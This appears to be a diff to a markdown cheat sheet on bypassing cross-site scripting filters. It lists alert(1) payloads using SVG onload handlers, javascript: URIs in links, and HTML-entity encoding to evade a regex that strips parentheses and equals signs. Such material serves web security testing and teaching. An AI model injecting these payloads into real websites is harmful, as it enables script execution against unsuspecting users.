@@ -210,7 +210,7 @@ If input.replace(/[=(]/g, '');  --> encode it;<script>alert&#40;1)</script>
 ### 1️⃣ When Tags Are Stripped: Use Non-Script Elements (e.g., <svg>)
 ```
 If the web application strips traditional <script> tags, you can use non-script tags that support event handlers (like onload):
-<svg/onload=alert(1)>
+              <svg/onload=alert(1)>
 The <svg> element is often allowed by filters because it's a vector graphic element.
 The onload event executes JavaScript when the SVG is loaded.
 ```
@@ -218,6 +218,16 @@ The onload event executes JavaScript when the SVG is loaded.
 ```
 If the input is reflected as-is without being treated as HTML, you can trick the parser using SVG vectors or JavaScript URIs.
 
-Payload Example               :<a href="javascript:alert(1)">Click Me!</a>
-Or, if links are sanitized    :<svg><a xlink:href="javascript:alert(1)">Click Me!</a></svg>
+      Payload Example               :<a href="javascript:alert(1)">Click Me!</a>
+      Or, if links are sanitized    :<svg><a xlink:href="javascript:alert(1)">Click Me!</a></svg>
+```
+### 3️⃣ Handling Character Replacement (Input Sanitization Bypass)
+```
+If the application applies regex-based sanitization like:
+input.replace(/[=(]/g, '');
+This filter removes ( or = characters. To bypass this, you can use HTML entity encoding:
+
+Payload Example                     :<script>alert&#40;1)</script>
+( is replaced with &#40;
+This allows the browser to decode it back into a valid character.
 ```
